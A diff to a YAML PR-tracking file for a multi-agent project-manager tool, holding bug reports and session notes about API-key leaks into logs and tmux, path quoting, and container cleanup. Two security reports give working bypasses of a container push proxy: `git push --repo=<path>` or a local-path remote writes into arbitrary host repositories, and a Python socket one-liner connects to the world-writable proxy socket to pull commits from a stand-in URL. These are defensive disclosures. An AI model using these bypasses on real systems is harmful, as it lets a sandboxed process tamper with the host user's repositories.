+      itself and is removed; a wait hold overrides an auto target sharing the prerequisite
+      and flipping that target to auto releases it so it merges once. Diamond F←C,D;
+      C←A; D←A,B completed end-to-end — merging A started only C, merging B only D,
+      C+D started F exactly once, F waited for manual merge then merged, auto-start
+      OFF. TUI `g` merge path verified; unknown ids rejected; removing the last target
+      turns auto-start off without killing windows. Harness facts for the next run:
+      run `pm session` and CLI with TMUX unset (else they adopt the orchestrator''s
+      session and its target set); fixtures under ~/.pm/workdirs need a local `origin`
+      remote or sign-off integration fails (''no target repository'') and every SIGNOFF_MERGE
+      is coerced to SIGNOFF_BLOCKED; `pm push` + merge the pm/sync-* branch before
+      `pm pr start`. The QA-loop ''Could not find planner pane'' seen here is environmental
+      (this PR''s qa_loop_ui change is comment-only).'
+    created_at: '2026-10-27T15:48:29Z'
+    last_edited: '2026-10-27T15:48:29Z'
+  model: provider:deepseek-flash
+  session_models:
+    impl: provider:deepseek-flash
+    review: provider:deepseek-flash
+    qa: provider:deepseek-flash
+    qa_planning: provider:deepseek-flash
+    qa_scenario: provider:deepseek-flash
+    qa_concretize: provider:deepseek-flash
+    qa_verification: provider:deepseek-flash
+    qa_finalize: provider:deepseek-flash
+    qa_interactive: provider:deepseek-flash
+    merge: provider:deepseek-flash
+    signoff: provider:claude-work
+  workdir: /home/matt/.pm/workdirs/project-manager-828c8d0a/pm-pr-25f4038-use-wait-for-merge-as-the-only-manua-c6fab519
+- id: pr-16e45ba
+  plan: bugs
+  title: 'Bug: a PR flipped back to in_review after a completed review loop sticks
+    at ''awaiting sign-off (hand-off on next scheduler pass)'''
+  branch: pm/pr-16e45ba-bug-a-pr-flipped-back-to-in-review-after-a-complet
+  status: pending
+  depends_on: []
+  description: 'Location: pm_core/tui/auto_start.py _auto_start_review_loops (skip
+    when app._review_loops already has a *completed* entry for the PR) + pm_core/tui/review_loop_ui.py
+    _poll_loop_state_inner (only hands review PASS to QA/sign-off for *newly done*
+    loops). autostart_state._awaiting_signoff_reason then reports "awaiting sign-off
+    (hand-off on next scheduler pass)" for a PR whose review-passed state is stale.
+
+
+    Repro (local backend, auto-start on with a wait-for-merge target whose closure
+    holds PR X):
+
+    1. X reaches sign_off and is held for manual merge (review loop completed, loop
+    entry cached in app._review_loops).
+
+    2. User runs `pm pr edit X --status in_review` (the documented "mark ready for
+    review without a throwaway window" path).
+
+    3. `pm autostart status` reports X as in_review / "review passed; QA skipped (skip_qa);
+    awaiting sign-off (hand-off on next scheduler pass)" forever. No new review loop
+    starts (skip-if-completed), and signoff_ui.advance_all only drives qa/sign_off
+    status PRs, so sign-off never runs.
+
+    4. Neither `pm autostart add <target>` (the documented nudge) nor cycling X through
+    in_progress -> in_review, nor killing the review window, recovers it; only a TUI
+    restart (or an explicit `d` review start) clears the cached loop entry.
+
+
+    Expected: either a re-review starts for an in_review PR with a stale completed
+    loop, or the status stops promising a hand-off that cannot happen. Observed: the
+    PR is stuck and never reaches a fresh sign-off.
+
+
+    Note: the skip-if-completed logic and the newly-done-only hand-off exist identically
+    on master (git show origin/master:pm_core/tui/auto_start.py line ~905), so this
+    predates the wait-for-merge PR; found incidentally during QA scenario 5.'
+  agent_machine: null
+  gh_pr: null
+  gh_pr_number: null
+  created_at: '2026-10-27T09:54:04.620652+00:00'
+  updated_at: '2026-10-27T09:54:04.620652+00:00'
+  started_at: null
+  reviewed_at: null
+  merged_at: null
+  notes: []
+- id: pr-84ebabf
+  plan: bugs
+  title: 'Bug: a claude-type provider api_key (even a ${VAR} reference) is written
+    as ANTHROPIC_API_KEY=<value> into the logged launch command and the tmux pane
+    command'
+  branch: pm/pr-84ebabf-bug-a-claude-type-provider-api-key-even-a-var-refe
+  status: in_progress
+  depends_on: []
+  description: 'pm_core/providers.py ProviderConfig.env_vars resolves api_key (_resolve_env_ref)
+    and pm_core/claude_launcher.py build_claude_shell_cmd inlines every provider env
+    value as NAME=<value> in the shell command (pre-existing on master: claude_launcher.py:937,
+    providers.py:75). log_shell_command then writes it at INFO to ~/.pm/debug/<tag>.log,
+    and tmux keeps it as the pane_start_command (tmux list-panes -F "#{pane_start_command}").
+    Live (QA S67 story 3, /pm-captures/scenarios/67/story3/secret-in-launch-cmd.txt):
+    provider mainstub (type claude, api_key ${ANTHROPIC_API_KEY}) as a PR qa_finalize
+    override; the three finalizer launches logged ANTHROPIC_API_KEY=<the dummy value>
+    and their panes carried it; ps after exec did not. Same class as the container
+    -e NAME=value leak this PR fixed (env values via the process env, not argv). Decide
+    how host panes get secret provider env (process env of the tmux client, a shell
+    reference for ${VAR} keys when the pane inherits the var, or redaction at least
+    in the log) and keep openai OPENAI_API_KEY the same.'
+  agent_machine: spark-424d
+  gh_pr: https://github.com/mjtomei/project_manager/pull/268
+  gh_pr_number: 268
+  created_at: '2026-10-26T05:09:15.878235+00:00'
+  updated_at: '2026-10-28T00:44:09.422718+00:00'
+  started_at: '2026-10-27T19:07:41.620041+00:00'
+  reviewed_at: null
+  merged_at: null
+  notes:
+  - id: note-1a74701
+    text: 'Launch handoff from user-approved critical-bug review, 2026-10-27: host
+      build_claude_shell_cmd still places resolved provider secrets in logged strings
+      and tmux pane_start_command. Prevent the secret transport/metadata exposure
+      as well as logging it; redaction alone does not fix the tmux copy. Use synthetic
+      canary credentials for tests and never reproduce by printing real credentials.
+      #249 already covers the separate container -e NAME=value issue (75f0dde6), so
+      avoid duplicating that work.'
+    created_at: '2026-10-27T18:43:31Z'
+    last_edited: '2026-10-27T18:43:31Z'
+  - id: note-c3f89aa
+    text: 'impl: fixed. build_claude_shell_cmd no longer interpolates provider env
+      values; it returns them via env_out. Host tmux panes get them with `-e NAME`
+      (value in the tmux client env, so only the name reaches #{pane_start_command});
+      foreground launches use execvpe; container exec uses `-e NAME` (runtime reads
+      the value from the pane env); send_keys (no production callers) sources a 0600
+      env file. launch_claude debug env dump now logs names only. Evidence: /pm-captures/impl/{pre-fix,post-fix}
+      (synthetic canary only) — pre-fix leaked into command, pane_start_command and
+      log; post-fix all three clean and the value still reaches the pane process env.
+      Full suite 3837 passed / 1 skipped (pytest 8.4.2) in /pm-captures/impl/post-fix/pytest-full.log.
+      Tests: test_provider_integration, test_tmux TestProviderEnvTransport, test_container
+      TestBuildExecCmdProviderEnv, test_claude_launcher TestLaunchClaudeInTmuxProviderEnv/TestWriteEnvFile.'
+    created_at: '2026-10-27T19:52:26Z'
+    last_edited: '2026-10-27T19:52:26Z'
+  - id: note-7db09b8
+    text: 'review-loop b1c1 i1: blocking bug found and fixed. tmux 3.2a only resolves
+      `-e NAME` from the client environment for new-session; new-window uses the server
+      env and split-window the session env, so every provider-override impl/review/QA/signoff/TUI
+      pane would have silently lost the key — or picked up an unrelated value from
+      the server env (e.g. the user real ANTHROPIC_API_KEY sent to a third-party base
+      URL). The post-fix capture had only exercised create_session, the one path that
+      works. Replaced the transport with a 0600 env file under ~/.pm/run sourced by
+      the pane (`sh -c "set -a; . file; set +a; rm -f file; <cmd>"`); a leading `cd
+      ... && ` is kept outside the wrapper so pane_transcript_path still parses it,
+      and files from panes that never ran are swept after 24h. Container exec keeps
+      `-e NAME` (the pane now carries the value). Added real-tmux tests TestProviderEnvReachesRealPane
+      that read the value back out of new_window/split_pane panes and assert pane_start_command
+      is clean (the old transport fails them). Re-captured /pm-captures/impl/post-fix
+      with new_window+split_pane (synthetic canary only); spec R2/A1/A5 updated with
+      a §7 finding. Full suite: 3841 passed, 1 skipped (pytest 8.4.2) in /pm-captures/impl/post-fix/pytest-full-review1.log.'
+    created_at: '2026-10-27T20:30:01Z'
+    last_edited: '2026-10-27T20:30:01Z'
+  - id: note-2aebc10
+    text: 'review-loop b1c1 i2: no behavioural changes. Fixed three docstrings that
+      still described the superseded `tmux -e NAME` transport (container.wrap_claude_cmd,
+      TestBuildExecCmdProviderEnv, tui.pane_ops.launch_pane) — they now describe the
+      0600 env-file transport. Added TestLaunchClaude::test_debug_env_dump_names_only
+      covering spec R4 (launch_claude debug dump names provider vars only; the command
+      handed to log_shell_command carries no value). Re-verified pane_start_command
+      parsing survives the wrapper (leading `cd ... && ` still matches _PANE_CD_RE;
+      --session-id and container exec still detected). Full suite 3842 passed / 1
+      skipped (pytest 8.4.2, markdown installed) in /pm-captures/review-b1c1-i2/pytest-full.log.
+      Out of scope, unchanged: create_container still passes `-e NAME=value` in its
+      argv (#249 owns that).'
+    created_at: '2026-10-27T20:54:02Z'
+    last_edited: '2026-10-27T20:54:02Z'
+  - id: note-2af6d76
+    text: 'QA scenario 6 concretizer notes (2026-10-27): (1) The apostrophe-workdir
+      edge case cannot be driven with a real claude launch: build_claude_shell_cmd
+      emits "$(cat <workdir>/pm/prompts/...)" with the path unquoted (pre-existing
+      at 0edfd481, unchanged by this PR), so a workdir containing an apostrophe makes
+      the pane command fail with ''sh: Syntax error: Unterminated quoted string''
+      and the session never starts. A workdir containing a space makes the prompt
+      empty (same raw $(cat ...)), also pre-existing. Scenario 6 therefore exercises
+      the apostrophe path with fake-claude (no prompt file) and the space path with
+      real claude via a workdir recorded by ''pm pr start --workdir <repo with a space>'',
+      where pane cwd/start-command/TUI tracking are still observable. (2) fake-claude
+      returns before adding --model/cd, so the ''--model openai:...'' flag check needs
+      a non-fake launch (read the launch line from pm log). (3) The tmux-failure-cleanup
+      edge case (no env file left when tmux fails) is not deterministically drivable
+      from the user surface; it is covered by tests/test_tmux.py::test_failed_tmux_removes_the_env_file.
+      (4) The TUI ''s'' action builds ''--transcript {tdir}/...'' unquoted and shlex.splits
+      it, so a project path containing a space breaks the TUI launch (pre-existing);
+      use a plain project root and record the awkward workdir with pm pr start --workdir.'
+    created_at: '2026-10-27T22:13:15Z'
+    last_edited: '2026-10-27T22:13:15Z'
+  - id: note-1f3143e
+    text: 'QA scenario 6 (baseline / hostile values / awkward workdirs) PASS. Observations
+      only, not failures: (1) with a provider selected, the launch line in pm log
+      is the pre-wrap command (`cd <workdir> && claude --model openai:synth-model
+      ...`, secret-free) while #{pane_start_command} is the `sh -c "set -a; . <env
+      file>; ..."` wrapper — the log does not show the wrapper; (2) `pm pr start --workdir
+      <new>` is ignored for an in_progress PR ("reusing existing workdir"); set `pm
+      pr edit <id> --status pending` first to re-record a workdir; (3) under fake-claude
+      the tech-tree tracked marker (spinner) is only visible ~5 s after launch because
+      the fake writes idle_prompt, and a killed impl pane leaves a stale spinner on
+      its node (pre-existing TUI behavior, unrelated to the env transport). Evidence:
+      /pm-captures/scenarios/6/ (CLI cast+mp4 for baseline, hostile key byte-for-byte,
+      stale sweep; tmux pane captures for space workdir).'
+    created_at: '2026-10-27T22:43:09Z'
+    last_edited: '2026-10-27T22:43:09Z'
+  - id: note-4da9b61
+    text: QA S6 capture artifacts completed after the review flag. /pm-captures/scenarios/6/cli/
+      now has transcript.log (tmux pipe-pane scrollback of the recorded session) alongside
+      recording.cast, recording.mp4 and manifest.md; new /pm-captures/scenarios/6/tui/
+      holds the recipe two-session TUI recording (transcript.log, recording.cast,
+      recording.mp4, manifest.md) for the space workdir (real claude, BASH_ENV-held
+      pane, cd outside wrapper, spinner, transcript UUID match) and the apostrophe
+      workdir (fake backend, wrapper without cd, canary only in the process env).
+      All nine stories were re-executed or re-verified on e559149f; verdict unchanged
+      PASS.
+    created_at: '2026-10-27T23:06:05Z'
+    last_edited: '2026-10-27T23:06:05Z'
+  - id: note-a17dac1
+    text: 'sign-off 2026-10-27 → SIGNOFF_REQA (QA evidence gap only; code, impl captures
+      and review all hold at e6cebed2-equivalent code, HEAD 75d0bc30, base master@f2650b46
+      clean). Scenario 6 verdict says all nine stories PASS, but /pm-captures/scenarios/6
+      only records 5 (baseline, hostile key, stale sweep in cli/; space + apostrophe
+      workdirs in tui/). No capture anywhere in /pm-captures shows the OpenAI-type
+      provider, which the PR description names explicitly ("keep openai OPENAI_API_KEY
+      the same") and the 19:12 note requires for every provider type (only mocked
+      unit tests cover it). Re-run scenario 6 on the current code and record, with
+      cast+mp4+transcript.log like cli/: (1) openai provider with fake-claude (story
+      4): the fake process /proc environ has OPENAI_API_KEY=canary86-oai-84ebabf and
+      OPENAI_BASE_URL exactly, and neither value is in pane_start_command, pm log,
+      the pane registry, ps -ef argv, tmux show-environment -g/-t, and no env-*.sh
+      is left; (2) openai with real claude (story 5): the pm log launch line and pane_start_command
+      show --model openai:synth-model, the cd prefix outside the sh -c wrapper, and
+      no key, and /proc/<claude pid>/environ has the OPENAI_* values; (3) unset ${VAR}
+      key (story 2): ANTHROPIC_API_KEY= (empty) in the process env, no error; (4)
+      pane killed before its command runs (story 8): its env-*.sh stays behind with
+      mode 0600 until the 24 h sweep. Synthetic canaries only. Scenarios 1–5 and the
+      5 recorded stories of scenario 6 stay valid; there is no need to redo them.'
+    created_at: '2026-10-27T23:20:00Z'
+    last_edited: '2026-10-27T23:20:00Z'
+  - id: note-29e730f
+    text: 'sign-off pass 2, 2026-10-27 → SIGNOFF_REQA again. Nothing changed since
+      note-a17dac1: HEAD 75d0bc30, master@f2650b46 clean, and no new QA capture (scenarios/6
+      files are all dated 23:11 or earlier). QA must still re-run scenario 6 and record
+      the four stories in note-a17dac1: openai + fake-claude, openai + real claude,
+      unset ${VAR} key, pane killed before its command runs. Each needs cast+mp4+transcript.log.
+      Scenarios 1-5 and the 5 recorded S6 stories stay valid. Minor, non-blocking:
+      tests/test_tmux.py TestProviderEnvTransport writes canary env-*.sh files into
+      the real ~/.pm/run (pm_home not redirected to tmp_path). Fix when convenient.'
+    created_at: '2026-10-27T23:41:15Z'
+    last_edited: '2026-10-27T23:41:15Z'
+  - id: note-9b6e56e
+    text: 'QA scenario 9 concretizer notes (2026-10-28): (1) "discuss" is NOT in model_config.SESSION_TYPES,
+      so `pm model set discuss provider:X` is rejected. The TUI discuss/Claude pane
+      resolves its provider through get_provider(None) -> PM_PROVIDER / per-session
+      provider file / providers.yaml `default`, so select the discuss provider with
+      `pm provider default <name>` (restore `pm provider default claude` afterwards).
+      (2) Do not export the ${VAR} canaries into the shared tmux server environment:
+      every pane inherits them and the "none of the other canaries" assertion becomes
+      untestable. Pass them command-scoped (`PM_QA_CANARY_IMPL=... pm pr start ...`)
+      so only the provider env transport carries the value into the launched process.
+      (3) Launch impl/review with `--background` (the auto-start mode). Without it,
+      `pm pr start`/`pm pr review` select their new window in the session and pane_ops.launch_pane
+      resolves the TUI window via get_window_id(), so a concurrent `?` then `h` discuss
+      split lands in the impl/review window instead of the TUI window. (4) With fake-claude,
+      build_claude_shell_cmd returns before the cd/--model flags, so each pane_start_command
+      is `sh -c "set -a; . <HOME>/.pm/run/env-XXXXXX.sh; set +a; rm -f <same>; fake-claude
+      --verdict NONE|PASS"` (no leading cd, no --model).'
+    created_at: '2026-10-28T00:20:26Z'
+    last_edited: '2026-10-28T00:20:26Z'
+  - id: note-dc1c8f1
+    text: 'QA scenario 8 (env-file privacy/lifetime R4 + unset ${VAR}) PASS on 75d0bc30.
+      Captures (cast+mp4+transcript.log, synthetic canaries only) in /pm-captures/scenarios/8/.
+      Story 1 = unset ${PM_QA_UNSET_VAR}: launch succeeds, fake-claude process env
+      has ANTHROPIC_API_KEY= (empty, not the stale session value), pane_start_command
+      carries only the env-*.sh path, pm log + pane registry clean, ~/.pm/run empty
+      after start. Story 2 = handoff file is 0600 in a 0700 dir, its canary value
+      reaches the process, and the file is gone once the pane command starts. Story
+      3 = pane killed before its command runs: orphan env-*.sh stays 0600 in a 0700
+      dir, referenced by no live pane, and is swept only by a later provider-env launch
+      once older than 24 h (fresh orphan kept, new launch file present). This covers
+      sign-off items (3) unset ${VAR} and (4) pane killed before its command runs;
+      items (1) openai + fake-claude and (2) openai + real claude still need recording
+      by scenario 6.'
+    created_at: '2026-10-28T00:32:08Z'
+    last_edited: '2026-10-28T00:32:08Z'
+  - id: note-f6ab894
+    text: 'QA scenario 7 (OpenAI-type provider) PASS at 75d0bc30; captures at /pm-captures/scenarios/7/{cli,tui}.
+      cli = impl + fake-claude via pm pr start (new-window path): #{pane_start_command}
+      is the 0600 env-file wrapper with only the file path; the fake process /proc
+      environ carries OPENAI_API_KEY=canary-84ebabf-do-not-use and OPENAI_BASE_URL=http://127.0.0.1:9/v1
+      exactly; neither value in pane command, pm log (grep exit 1), pane registry,
+      ps argv or tmux show-environment -g/-t; env file removed and nothing under ~/.pm/run
+      contains the canary. tui = review + real claude via pm pr review (split-pane
+      path): start command `cd <workdir> && sh -c "... env file ...; claude --model
+      openai:synth-model ..."` with the cd outside the wrapper; pm log line is the
+      pre-wrap `cd <workdir> && claude --model openai:synth-model`; claude /proc environ
+      has both OPENAI_* values; registry review-claude entry stores the unwrapped,
+      value-free command; env file removed. Each capture has transcript.log + recording.cast
+      + recording.mp4 + manifest.md. These are the two openai stories the sign-off
+      REQA asked for (openai+fake, openai+real); they live under scenarios/7, not
+      scenarios/6.'
+    created_at: '2026-10-28T00:43:29Z'
+    last_edited: '2026-10-28T00:43:29Z'
+  - id: note-96c4635
+    text: 'QA scenario 9 (mixed launch surfaces, three providers concurrently) PASS
+      on 75d0bc30. Three panes created ~0.3 s apart through three code paths (pm pr
+      start new window, pm pr review new window, TUI discuss split) each got its own
+      0600 env-*.sh under ~/.pm/run (3 distinct paths seen by a poller, dir 700, none
+      left behind) and its own provider values in /proc/<fake pid>/environ (impl ANTHROPIC_*,
+      review OPENAI_*, discuss ANTHROPIC_*), exactly one canary per process; no canary
+      in any pane_start_command, pm log, ~/.pm/debug, pane registry, tmux show-environment
+      -g/-t or ps argv. Discuss C-d teardown: pane gone in 224 ms, window 0 rebalanced
+      99→200 cols (pane width == window width), handle_pane_exited + deferring rebalance
+      logged, discuss row removed from the registry. Focused regression tests (test_tmux
+      TestProviderEnvTransport + TestProviderEnvReachesRealPane, test_claude_launcher
+      provider-env/TestWriteEnvFile, test_container TestBuildExecCmdProviderEnv, test_provider_integration)
+      25 passed. Evidence: /pm-captures/scenarios/9/{tui,cli} (cast+mp4+transcript.log+manifest).
+      QA workdir: /scratch/pm-s9-1793147411.'
+    created_at: '2026-10-28T00:44:09Z'
+    last_edited: '2026-10-28T00:44:09Z'
+  model: provider:deepseek-flash
+  session_models:
+    impl: provider:deepseek-flash
+    review: provider:deepseek-flash
+    qa: provider:deepseek-flash
+    qa_planning: provider:deepseek-flash
+    qa_scenario: provider:deepseek-flash
+    qa_concretize: provider:deepseek-flash
+    qa_verification: provider:deepseek-flash
+    qa_finalize: provider:deepseek-flash
+    qa_interactive: provider:deepseek-flash
+    signoff: provider:claude-work
+    merge: provider:deepseek-flash
+  workdir: /home/matt/.pm/workdirs/project-manager-828c8d0a/pm-pr-84ebabf-bug-a-claude-type-provider-api-key-e-registered-20261027
+- id: pr-9ff8a1b
+  plan: bugs
+  title: 'Bug: pm qa debug/launch crash when the project repo and ~/.pm/workdirs are
+    on different filesystems (git clone --local cross-device hardlink)'
+  branch: pm/pr-9ff8a1b-bug-pm-qa-debug-launch-crash-when-the-project-repo
+  status: pending
+  depends_on: []
+  description: 'Location: pm_core/qa_loop.py create_scenario_workdir (~line 320) runs
+    `git clone --local <repo_root> <dest>`; --local hardlinks objects, so it fails
+    when <repo_root> and ~/.pm/workdirs are on different filesystems. Repro: project
+    at /scratch/x (nvme) with HOME=/home/user/.pm on overlay; run `pm qa debug <instruction>
+    --foreground` -> CalledProcessError: git clone --local ... returned exit status
+    128, fatal: failed to create link ...: Invalid cross-device link. Same for any
+    qa path that clones from a project root on another mount. Fix: on clone failure,
+    retry with --no-hardlinks (or always pass it when st_dev differs). Found during
+    QA S3 of pr-84ebabf; worked around by pointing HOME at a same-device dir.'
+  agent_machine: null
+  gh_pr: null
+  gh_pr_number: null
+  created_at: '2026-10-27T22:20:00.072106+00:00'
+  updated_at: '2026-10-27T22:20:00.072106+00:00'
+  started_at: null
+  reviewed_at: null
+  merged_at: null
+  notes: []
+- id: pr-e847a7a
+  plan: bugs
+  title: 'Bug: launch commands interpolate the workdir prompt path and TUI transcript
+    path unquoted (apostrophe/space in workdir or project path breaks the pane command)'
+  branch: pm/pr-e847a7a-bug-launch-commands-interpolate-the-workdir-prompt
+  status: pending
+  depends_on: []
+  description: 'Found during pr-84ebabf QA scenario 6 (pre-existing, unchanged by
+    that PR). pm_core/claude_launcher.py build_claude_shell_cmd appends "$(cat <workdir>/pm/prompts/...)"
+    with the prompt-file path not shell-quoted inside the command substitution (around
+    line 1040). A workdir containing an apostrophe makes the pane command fail (''sh:
+    Syntax error: Unterminated quoted string''); a workdir containing a space yields
+    an empty prompt. Separately, the TUI start/review/merge actions build ''--transcript
+    {tdir}/impl-<id>.jsonl'' unquoted and shlex.split it (pm_core/tui/pr_view.py:155,210;
+    pm_core/tui/review_loop_ui.py:715), so a project path containing a space breaks
+    the TUI launch. Fix: shlex.quote the paths at each interpolation and add tests
+    with a workdir/project path containing a space and an apostrophe.'
+  agent_machine: null
+  gh_pr: null
+  gh_pr_number: null
+  created_at: '2026-10-27T23:16:14.111057+00:00'
+  updated_at: '2026-10-27T23:16:14.111057+00:00'
+  started_at: null
+  reviewed_at: null
+  merged_at: null
+  notes: []
+- id: pr-a9803aa
+  plan: bugs
+  title: 'Bug: push proxy local-path origin rejection is bypassed by git push --repo=<path>'
+  branch: pm/pr-a9803aa-bug-push-proxy-local-path-origin-rejection-is-bypa
+  status: pending
+  depends_on: []
+  description: 'pm_core/push_proxy.py `_execute_push` rejects a push whose remote
+    resolves to a local path (fail-closed, since a local-path push would write into
+    another host clone), but the check only inspects the remote named by the first
+    positional arg (default origin). `git push --repo=<path>` names the repository
+    through the option instead, so `_extract_remote_name` returns "origin", `_resolve_local_remote_url(workdir,
+    "origin")` returns None (origin is the real upstream), and `_local_push` then
+    runs `git -C <workdir> push --repo=<path>` as the host user. Verified with git
+    2.34.1: `git push --repo=/tmp/x.git` (no positional) pushes the current branch
+    to that local repo.
+
+
+    Reachability: the in-container ~/.local/bin/git wrapper forwards push/fetch/pull/ls-remote
+    args verbatim to the proxy, so a container process can run `git push --repo=/home/<user>/any/repo`
+    and write the allowed branch into any host local git repo outside its mounted
+    workdir. The allowed-branch restriction still holds; the path restriction does
+    not.
+
+
+    Repro (host): start a proxy for a clone whose origin is a real URL (or mock _resolve_local_remote_url
+    -> None), send {"cmd":"push","args":["--repo=/tmp/victim.git"]}; observe the response
+    runs git push with --repo. Fix idea: treat `--repo`/`--repo=` like the local-path
+    origin check (reject when the named repository is a local path, or reject the
+    option outright since the proxy is origin-scoped).'
+  agent_machine: null
+  gh_pr: null
+  gh_pr_number: null
+  created_at: '2026-10-27T07:45:34.452329+00:00'
+  updated_at: '2026-10-27T08:10:08.615809+00:00'
+  started_at: null
+  reviewed_at: null
+  merged_at: null
+  notes:
+  - id: note-913e50f
+    text: 'Additional bypass found while reviewing pr-748e708 (2026-10-27): the same
+      local-path-origin rejection is also bypassed by naming the local repository
+      as the *positional remote* instead of `--repo`, e.g. `git push /tmp/victim.git
+      <allowed-branch>` or `git push file:///tmp/victim.git <allowed-branch>`. `_extract_remote_name`
+      returns that string, `_resolve_local_remote_url(workdir, "/tmp/victim.git")`
+      runs `git remote get-url /tmp/victim.git`, which fails (not a configured remote)
+      and returns None, so `_execute_push` treats it as a real remote and `_local_push`
+      runs `git -C <workdir> push /tmp/victim.git ...` on the host. A `file://` URL
+      is also treated as a real remote by the `"://" in url` test in `_resolve_local_remote_url`.
+      Fixing this PR should therefore reject a local path/`file://` URL in the positional
+      remote too, not only `--repo`. The in-container wrapper forwards args verbatim,
+      so both are reachable from a container. Pre-existing on master, unchanged by
+      pr-748e708.'
+    created_at: '2026-10-27T08:10:08Z'
+    last_edited: '2026-10-27T08:10:08Z'
+- id: pr-e618b9c
+  plan: bugs
+  title: 'Push proxy socket is world-connectable: any local user can push/pull as
+    the host user'
+  branch: pm/pr-e618b9c-push-proxy-socket-is-world-connectable-any-local-u
+  status: pending
+  depends_on: []
+  description: 'pm_core/push_proxy.py PushProxy.start() chmods the proxy socket 0o777
+    and the socket directory is created by os.makedirs with the default mode (0755),
+    both under world-writable /tmp (/tmp/pm-push-proxy-*/push.sock). The daemon runs
+    git as the host user with host credentials, so any local user can connect and
+    issue {"cmd":"pull","args":["<url>","<ref>"]} to merge attacker-controlled commits
+    into a served PR worktree, or {"cmd":"push","args":["origin","<allowed-branch>"]}
+    to push to the PR branch as the user. Repro: as another local user, `python3 -c
+    "import socket,json; s=socket.socket(socket.AF_UNIX); s.connect(\"/tmp/pm-push-proxy-<tag>-<pr>-<token>/push.sock\");
+    s.sendall((json.dumps({\"cmd\":\"pull\",\"args\":[\"https://example.com/x.git\",\"main\"]})+\"\n\").encode());
+    print(s.recv(4096))"` while a container proxy is running. Restricted (not fixed)
+    by pr-748e708 spec R4, which now rejects a request naming any workdir other than
+    the proxy own one, so the exposure is limited to the served workdir; the allowed-branch
+    and dangerous-flag checks still apply. Fix direction: stop relying on world-writable
+    /tmp - create the socket root as a 0700 directory (e.g. $XDG_RUNTIME_DIR/pm or
+    ~/.pm/run) with a 0600 socket. The container process runs as the host uid in both
+    supported modes (docker: useradd -u host_uid + exec -u pm; podman: --userns=keep-id),
+    so it does not need world access. That would also retire most of the /tmp squatting/symlink/ownership
+    guards in push_proxy.py. Needs a decision on the container-uid assumption before
+    changing the mode, since a wrong assumption breaks every container push.'
+  agent_machine: null
+  gh_pr: null
+  gh_pr_number: null
+  created_at: '2026-10-27T20:41:33.365173+00:00'
+  updated_at: '2026-10-27T20:41:33.365173+00:00'
+  started_at: null
+  reviewed_at: null
+  merged_at: null
+  notes: []
+- id: pr-40c855a
+  plan: bugs
+  title: 'Bug: container-mode launch fails for project dirs with characters podman
+    rejects in names (e.g. [ ])'
+  branch: pm/pr-40c855a-bug-container-mode-launch-fails-for-project-dirs-w
+  status: pending
+  depends_on: []
+  description: 'Location: pm_core/container.py create_container() builds the container
+    name as pm-<session_tag>-impl-<pr_id>; the session tag embeds the repo directory
+    name verbatim (pm_core/paths.py get_session_tag: {dir_name}-{md5[:8]}).
+
+
+    Repro: project dir s6c-[xyz]-long-project-name-forcing-a-hashed-socket-dir with
+    nested_podman: true, container mode enabled and a pm session running. `pm pr start
+    <pr> --background` starts the shared push proxy, then podman create fails: "names
+    must match [a-zA-Z0-9][a-zA-Z0-9_.-]*: invalid argument" (any of [ ] * ? in the
+    dir name). pm surfaces the generic ContainerError "Failed to create container
+    pm-<tag>-impl-<pr>. Is podman running? Disable container mode with ''pm container
+    disable'' to run without containers.", so the real cause is invisible, and the
+    push proxy it started first is left in /tmp until `pm session kill`.
+
+
+    Expected: either sanitize/encode the container name (keeping it unique and mapped
+    back for cleanup/adoption) or fail with an explicit "invalid container name" error
+    before starting the proxy. Scenario 6 story 3 of the pr-748e708 QA run exercises
+    the leftover-proxy cleanup; the naming limitation itself is out of that PR''s
+    scope.'
+  agent_machine: null
+  gh_pr: null
+  gh_pr_number: null
+  created_at: '2026-10-27T23:57:02.733584+00:00'
+  updated_at: '2026-10-27T23:57:02.733584+00:00'
+  started_at: null
+  reviewed_at: null
+  merged_at: null
+  notes: []
+- id: pr-436d18a
+  plan: bugs
+  title: 'Bug: pm container cleanup silently removes nothing on podman 3.x (tab in
+    --format renders as spaces)'
+  branch: pm/pr-436d18a-bug-pm-container-cleanup-silently-removes-nothing-
+  status: pending
+  depends_on: []
+  description: 'Location: pm_core/cli/container.py container_cleanup (lines ~275-300).
+    Repro on podman 3.4.4: `podman ps -a --format "{{.Names}}\t{{.Status}}"` renders
+    the \t as spaces, so `line.split("\t", 1)` never splits and the whole line ("pm-<tag>-impl-<pr>    Up
+    3 minutes ago") is passed to remove_container as the container name. `podman rm
+    -f` then fails with "no container with name or ID ... found", the failure is swallowed
+    (check=False) and the command still prints "Removed N container(s)" while every
+    container keeps running. Observed in QA scenario 10 for pr-748e708: `pm container
+    cleanup --pr pr-ef361dc` reported "Removed 2 container(s)" but both containers
+    were still Up; the debug log (~/.pm/debug/<tag>.log) shows the bogus name in the
+    rm error. Fix: use a delimiter podman actually renders (e.g. {{.Names}}|{{.Status}}
+    or split(None,1)) and count only removals that actually succeeded.'
+  agent_machine: null
+  gh_pr: null
+  gh_pr_number: null
+  created_at: '2026-10-28T03:01:10.948548+00:00'
+  updated_at: '2026-10-28T03:01:10.948548+00:00'
   started_at: null
   reviewed_at: null
   merged_at: null
